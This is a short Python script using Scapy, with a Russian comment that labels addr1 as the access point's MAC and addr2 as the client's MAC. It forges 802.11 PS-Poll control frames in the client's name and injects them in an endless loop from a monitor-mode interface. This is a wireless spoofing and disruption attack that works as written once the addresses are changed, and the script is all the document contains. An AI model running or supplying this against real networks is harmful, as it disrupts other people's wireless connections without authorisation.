from scapy.all import *

frame = RadioTap()/Dot11FCS(type=1, 
                            subtype=10, 
                            addr1='84:c9:b2:a2:f6:26', 
                            addr2='0e:98:ab:74:cf:a0')
sendp(frame, iface='wlan1', inter=0.050, loop=1, monitor=True)

#Здесь addr1 – MAC-адрес точки доступа, addr2 – MAC-адрес клиента.